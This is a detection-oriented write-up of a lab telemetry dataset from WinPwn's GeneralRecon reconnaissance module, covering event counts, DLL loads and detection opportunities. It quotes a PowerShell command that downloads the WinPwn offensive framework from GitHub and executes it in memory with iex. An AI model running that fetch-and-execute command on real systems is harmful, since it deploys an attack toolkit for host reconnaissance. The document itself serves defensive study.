# T1082-18: System Information Discovery — WinPwn - GeneralRecon

## Technique Context

T1082 (System Information Discovery) covers the enumeration of host-based information that adversaries perform after gaining access to understand the environment they have compromised. `GeneralRecon` is a WinPwn module that performs a broad system reconnaissance sweep: gathering OS version, installed software, network configuration, domain information, users and groups, running services, and environment variables. It is the "initial survey" function — building a comprehensive picture of the compromised host before deciding on next steps.

Real-world attackers typically perform exactly this kind of general reconnaissance before escalating privileges or moving laterally. Understanding the OS version and patch level, the domain structure, the installed software (including security products), and the network configuration tells an attacker what exploits might be applicable, what credentials might be accessible, and what paths exist to reach adjacent systems. `GeneralRecon` automates this initial survey phase in a single in-memory PowerShell invocation.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `GeneralRecon` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The dataset spans a 7-second window (23:31:34Z to 23:31:41Z), capturing 265 total events across all channels — the highest total event count in the T1082 WinPwn series, driven primarily by a large Sysmon footprint (128 events: 61 EID 7, 55 EID 11, 4 EID 1, 4 EID 10, 3 EID 17).

The Security channel (25 events, all EID 4688) records process creation activity. The non-mscorsvw process creation events visible in the samples include `whoami.exe` (twice, for ART test framework identity checks) and `powershell.exe` with an empty command block. The main `GeneralRecon` invocation follows the standard WinPwn pattern:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GeneralRecon -noninteractive -consoleoutput}
```

The Sysmon channel (128 events) is notable: GeneralRecon generates more Sysmon events than any other single T1082 WinPwn test. The 61 EID 7 (image load) events indicate that the GeneralRecon module loads a large number of DLLs and .NET assemblies into the PowerShell process. Among the non-assembly DLLs visible in the samples are:

- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MpClient.dll`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MpOAV.dll`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll`

The MpClient.dll and MpOAV.dll loads indicate GeneralRecon queried Windows Defender's status — consistent with a broad system reconnaissance module checking installed security products. The `clrjit.dll` load is the .NET JIT compiler being invoked for in-process .NET execution.

Sysmon EID 17 (named pipe create) records three PowerShell host pipes under SYSTEM, indicating multiple PowerShell execution contexts were spawned during this 7-second window:
```
PipeName: \PSHost.134180047027699798.3728.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: NT AUTHORITY\SYSTEM
```

The 55 EID 11 (file create) events represent the highest file system write activity in the T1082 series. This reflects GeneralRecon's broad enumeration producing substantial .NET NGen compilation side effects as it loads its comprehensive set of PowerShell modules and .NET dependencies.

The Application channel records EID 15: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON" — this event appears across multiple WinPwn tests and reflects Defender's background service maintaining its status registration, not an actual change in protection state.

Compared to the defended dataset (27 sysmon, 11 security, 51 PowerShell events), the undefended GeneralRecon produces nearly 5x the Sysmon events. The defended execution was significantly curtailed.

## What This Dataset Does Not Contain

The reconnaissance output collected by GeneralRecon — OS version, domain information, network configuration, user enumeration results, installed software list — is sent to console stdout and is not captured in Windows event telemetry.

The DNS query and network connection events showing WinPwn downloading from GitHub are present in the EID breakdown (1 EID 22) but the specific sample showing the download connection is not in the 20-event sample selection.

No LSASS access or credential extraction events appear — GeneralRecon is a reconnaissance module, not a credential harvesting module.

## Assessment

GeneralRecon produces the largest event footprint in the T1082 WinPwn series despite executing in 7 seconds: 128 Sysmon events, 25 Security events, and 111 PowerShell events. The high EID 7 (image load) and EID 11 (file create) counts indicate that the module loads a comprehensive set of .NET types covering the full breadth of Windows management APIs it needs for its broad reconnaissance sweep — WMI, registry, network, security product, and domain enumeration.

The loading of `MpClient.dll` and `MpOAV.dll` from Defender's platform directory into the PowerShell process is a specific indicator: GeneralRecon explicitly queries Defender's status as part of its security product enumeration. This DLL load pattern — legitimate security software DLLs being loaded into a non-security-product PowerShell process — is an indicator that the process is actively querying AV/EDR state.

The three named pipe creation events (EID 17) in a 7-second window suggest multiple subordinate PowerShell sessions were spawned, which is consistent with a framework module that delegates some enumeration work to invoked sub-sessions.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — WinPwn GeneralRecon invocation:** The command line containing `GeneralRecon -noninteractive -consoleoutput` with the WinPwn GitHub URL is the primary indicator. The pinned commit hash is consistent across all T1082 WinPwn tests.

**Sysmon EID 7 — MpClient.dll / MpOAV.dll loaded into PowerShell:** Windows Defender's client DLLs being loaded into a non-interactive `powershell.exe` process running as SYSTEM indicates security product enumeration. These DLLs are legitimately used by Defender's own processes, but their appearance in a PowerShell process loaded from an offensive framework is anomalous.

**Sysmon EID 7 — Volume anomaly (61 image loads):** 61 distinct DLL/assembly loads in a 7-second PowerShell session is a strong behavioral indicator of in-memory framework loading. Normal PowerShell scripts do not trigger this volume of assembly loading.

**Sysmon EID 17 — Multiple named pipe creates in short window:** Three PowerShell host pipes created under SYSTEM within 7 seconds indicates multiple PowerShell execution contexts were activated — consistent with a module that spawns sub-sessions for parallelized enumeration.

**Application EID 15 — Defender status update during execution:** The Defender status update event co-occurring with offensive tool execution confirms that GeneralRecon's security product enumeration queried the Defender service registration. This event type correlates with any activity that triggers the SecurityCenter provider's status check.

**Sysmon EID 11 — 55 file creation events:** The large file write volume during a short recon-only session (GeneralRecon should not be writing output files) is explained by .NET NGen compilation of the many assemblies loaded. This is a secondary indicator corroborating in-memory .NET framework activity.
